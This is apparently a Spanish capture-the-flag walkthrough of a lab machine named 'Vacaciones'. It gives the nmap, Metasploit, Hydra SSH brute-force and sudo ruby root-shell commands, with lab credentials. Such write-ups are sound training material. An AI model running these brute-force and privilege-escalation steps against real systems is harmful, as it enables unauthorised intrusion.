# Vacaciones

## 1. Reconocimiento de Puertos con Nmap

Realizamos un escaneo con `nmap` para detectar puertos abiertos y sus versiones. 

```bash
nmap -sC -sV --open <IP_DEL_OBJETIVO>
```

**Resultados Clave:**

*   `22/tcp open ssh OpenSSH 7.6p1 Ubuntu`
*   `80/tcp open http Apache httpd 2.4.29 ((Ubuntu))`

## 2. Enumeración Web

Al acceder a la dirección IP del objetivo en un navegador web, la página parece vacía. Sin embargo, al inspeccionar el código fuente o los elementos de la página, encontramos una pista crucial.

### 2.1. Pista en el Código Fuente

En el código fuente de la página web, se encuentra un comentario o un elemento oculto con el siguiente mensaje:

```txt
De : Juan Para: Camilo , te he dejado un correo es importante...
```

Esta pista nos proporciona dos posibles nombres de usuario: **Juan** y **Camilo**. Además, la mención de un "correo importante" sugiere que la información adicional podría estar en el sistema de correo del servidor.

## 3. Enumeración de Usuarios SSH (Intento Fallido)

La versión de OpenSSH (7.6p1) es conocida por una vulnerabilidad de enumeración de usuarios (CVE-2018-15473). Intentamos usar herramientas para explotar esto, pero a veces, en entornos de laboratorio, estos exploits pueden dar falsos positivos o no funcionar como se espera.

### 3.1. Intento con Metasploit

Aunque la vulnerabilidad existe, el módulo de Metasploit (`auxiliary/scanner/ssh/ssh_enumusers`) puede reportar falsos positivos o no ser efectivo en todas las configuraciones.

```bash
sudo msfdb init && msfconsole
# use auxiliary/scanner/ssh/ssh_enumusers
# set RHOSTS <IP_DEL_OBJETIVO>
# set USER_FILE /path/to/wordlist/unix_users.txt
# run
```

Si el módulo indica "throws false positive results. Aborting.", significa que no es fiable para enumerar usuarios en este caso.
### 3.2. Intento con exploit de Github
tampoco lo conseguimos con el exploit 
```bash
git clone https://github.com/Sait-Nuri/CVE-2018-15473.git
```

### 3.2. Fuerza Bruta con Hydra

Dado que tenemos nombres de usuario potenciales (Juan y Camilo) de la pista web, podemos intentar un ataque de fuerza bruta directamente contra el servicio SSH. 

Utilizamos `hydra` para intentar adivinar la contraseña del usuario `camilo` con un diccionario de contraseñas.

```bash
hydra -l camilo -P /path/to/wordlist/rockyou.txt ssh://<IP_DEL_OBJETIVO>
```

**Resultado Clave:**

*   `[22][ssh] host: <IP_DEL_OBJETIVO> login: camilo password: password1`

Esto nos proporciona la contraseña para el usuario `camilo`: **password1**.

## 4. Acceso Inicial y Pivote de Usuario

Con las credenciales de `camilo`, podemos acceder al servidor SSH y buscar más pistas.

### 4.1. Conexión SSH como Camilo

```bash
ssh camilo@<IP_DEL_OBJETIVO>
# Contraseña: password1
```

### 4.2. Búsqueda del "Correo Importante"

La pista web mencionaba un "correo importante". En sistemas Linux, los correos de los usuarios suelen almacenarse en `/var/mail/`. Navegamos a este directorio y buscamos el correo de `camilo`.

```bash
cd /var/mail/
ls
# Vemos el directorio 'camilo'
cd camilo
cat correo.txt
```

**Contenido del Correo:**

```
Hola Camilo,

Me voy de vacaciones y no he terminado el trabajo que me dio el jefe. Por si acaso lo pide, aquí tienes la contraseña: 2k84dicb
```

Este correo nos proporciona una nueva contraseña y, lo más importante, una pista sobre otro usuario: **Juan**.

### 4.3. Acceso SSH como Juan

Intentamos acceder al servidor SSH como `juan` utilizando la contraseña obtenida del correo: `2k84dicb`.

```bash
ssh juan@<IP_DEL_OBJETIVO>
# Contraseña: 2k84dicb
```

## 5. Escalada de Privilegios

Una vez que hemos obtenido acceso SSH como el usuario `juan`, el objetivo es escalar privilegios a `root`.

### 5.1. Verificación de Permisos Sudo

Verificamos qué comandos puede ejecutar el usuario `juan` con `sudo` sin necesidad de contraseña.

```bash
sudo -l
```

**Resultado :**

*   `User juan may run the following commands on ...:
	(ALL) NOPASSWD: /usr/bin/ruby`

Esto significa que el usuario `juan` puede ejecutar el binario `/usr/bin/ruby` como cualquier usuario (incluido `root`) sin necesidad de introducir su contraseña.

### 5.2. Obtención de Shell de Root con Ruby

`ruby` es un lenguaje de programación que, si se puede ejecutar con `sudo` sin contraseña, puede ser usado para obtener un shell de `root`. Consultamos [GTFOBins](https://gtfobins.github.io/gtfobins/ruby/#sudo) para la técnica específica.

Para obtener un shell de `root`, ejecutamos `ruby` con el flag `-e` para ejecutar código directamente, y el comando `exec "/bin/sh"` para lanzar un shell.

```bash
sudo -u root /usr/bin/ruby -e 'exec "/bin/sh"'
```

El comando `whoami` confirmará que hemos escalado exitosamente a `root`.

```bash
whoami
# root
```
